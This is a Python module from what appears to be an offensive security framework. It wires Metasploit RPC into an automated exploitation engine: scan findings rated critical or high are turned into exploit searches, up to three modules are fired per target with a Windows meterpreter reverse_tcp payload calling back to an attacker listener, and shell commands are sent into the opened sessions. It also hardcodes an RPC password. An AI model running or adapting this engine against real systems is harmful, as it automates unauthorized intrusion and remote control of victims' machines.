# cybermodules/autoexploit.py

import datetime
import logging
import time
import threading

try:
    from pymetasploit3.msfrpc import MsfRpcClient
except Exception:
    MsfRpcClient = None

from cyberapp.models.db import db_conn
from cyberapp.settings import DB_NAME

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class AutoExploit:
    def __init__(self, scan_id, target, db_name=None):
        self.scan_id = scan_id
        self.target = target
        self.db_name = db_name or DB_NAME

    def log(self, message, level="INFO"):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] [AutoExploit/{level}] {message}")
        try:
            with db_conn(self.db_name) as conn:
                conn.execute(
                    """
                    INSERT INTO tool_logs (scan_id, tool_name, output)
                    VALUES (?, ?, ?)
                    """,
                    (self.scan_id, "AUTOEXPLOIT", f"[{level}] {message}"),
                )
                conn.commit()
        except Exception:
            pass

    def _critical_vulns(self):
        try:
            with db_conn(self.db_name) as conn:
                rows = conn.execute(
                    """
                    SELECT type, url FROM vulns
                    WHERE scan_id = ? AND type IN ('SQL_INJECTION', 'RCE', 'GIZLI ANAHTAR')
                    """,
                    (self.scan_id,),
                ).fetchall()
            return rows
        except Exception:
            return []

    def start(self):
        self.log(f"AutoExploit started for {self.target}")
        vulns = self._critical_vulns()
        if not vulns:
            self.log("No critical vulns found; AutoExploit skipped", "INFO")
            return False

        for vuln_type, url in vulns:
            self.log(f"Simulating exploit for {vuln_type} at {url}", "WARNING")

        try:
            with db_conn(self.db_name) as conn:
                conn.execute(
                    """
                    INSERT INTO intel (scan_id, type, data)
                    VALUES (?, ?, ?)
                    """,
                    (self.scan_id, "AUTOEXPLOIT_RESULT", f"Simulated exploitation on {self.target}"),
                )
                conn.commit()
        except Exception:
            pass

        self.log("AutoExploit finished", "SUCCESS")
        return True


class AutoExploitEngine:
    _instance = None
    _lock = threading.Lock()

    def __new__(cls, *args, **kwargs):
        if not cls._instance:
            with cls._lock:
                if not cls._instance:
                    cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self, password='rascal123', host='127.0.0.1', port=55553):
        if not hasattr(self, 'initialized'):
            if MsfRpcClient is None:
                logger.warning("pymetasploit3 not installed; AutoExploitEngine disabled")
                self.client = None
            else:
                try:
                    self.client = MsfRpcClient(password, host=host, port=port, ssl=False)
                except Exception as e:
                    logger.warning("AutoExploitEngine disabled: %s", e)
                    self.client = None
            self.active_sessions = {}
            self.initialized = True

    def search_exploit(self, query):
        """CVE, service name veya keyword ile exploit ara"""
        if self.client is None:
            return []
        try:
            results = self.client.modules.search(query)
            exploits = [m['fullname'] for m in results if m['type'] == 'exploit']
            return exploits
        except Exception as e:
            logger.error(f"Search error: {e}")
            return []

    def exploit_vuln(self, target_ip, target_port, exploit_module, lhost, lport=4444):
        """Tek bir vulnerability için exploit dene"""
        if self.client is None:
            return {"status": "error", "message": "AutoExploitEngine disabled (missing pymetasploit3)"}
        try:
            exploit = self.client.modules.use('exploit', exploit_module)
            exploit['RHOSTS'] = target_ip
            if target_port:
                exploit['RPORT'] = int(target_port)

            payload = self.client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
            payload['LHOST'] = lhost
            payload['LPORT'] = lport

            result = exploit.execute(payload=payload)

            if result.get('job_id') is not None:
                logger.info(f"Exploit started: {exploit_module} -> {target_ip}")
                time.sleep(8)  # session oluşması için bekle

                sessions = self.client.sessions.list
                for sid, info in sessions.items():
                    if sid not in self.active_sessions:
                        self.active_sessions[sid] = info
                        return {
                            "status": "success",
                            "session_id": sid,
                            "job_id": result['job_id'],
                            "info": info
                        }
                return {"status": "running", "job_id": result['job_id']}
            else:
                return {"status": "failed", "reason": "No job started"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    def get_sessions(self):
        if self.client is None:
            return {}
        return self.client.sessions.list

    def shell_interact(self, session_id, command):
        """Meterpreter session'a komut gönder ve çıktı al"""
        if self.client is None:
            return "AutoExploitEngine disabled (missing pymetasploit3)"
        try:
            session = self.client.sessions.session(session_id)
            session.write(command + '\n')
            time.sleep(2)
            output = session.read()
            return output.strip()
        except Exception as e:
            return f"Error: {str(e)}"

    def close_session(self, session_id):
        if self.client is None:
            return
        try:
            self.client.sessions.stop(session_id)
            self.active_sessions.pop(session_id, None)
        except:
            pass

    def auto_chain_from_findings(self, findings, lhost, lport=4444):
        """
        Scan'den gelen bulguları al, kritik olanlara otomatik exploit dene
        findings örneği: list of dicts from Nuclei/Nmap results
        """
        results = []
        for finding in findings:
            severity = finding.get('severity', '').lower()
            if severity not in ['critical', 'high']:
                continue

            # CVE varsa direkt ara, yoksa service + port ile tahmin et
            query = finding.get('cve') or finding.get('name') or finding.get('service', '')

            if not query:
                continue

            logger.info(f"[AUTO EXPLOIT] {finding['ip']}:{finding.get('port')} - {query} için exploit aranıyor...")

            exploits = self.search_exploit(query)
            if not exploits:
                results.append({"ip": finding['ip'], "status": "no_exploit_found", "query": query})
                continue

            # İlk 3 exploiti dene (daha fazla istersen artır)
            for exploit_module in exploits[:3]:
                result = self.exploit_vuln(
                    target_ip=finding['ip'],
                    target_port=finding.get('port'),
                    exploit_module=exploit_module,
                    lhost=lhost,
                    lport=lport
                )
                result['finding'] = finding.get('name') or finding.get('cve')
                result['exploit_module'] = exploit_module
                results.append(result)

                if result.get('status') == 'success':
                    logger.info(f"[+] BAŞARILI EXPLOIT: {exploit_module} → Session {result.get('session_id')}")
                    break  # başarılıysa diğer modülleri deneme

        return results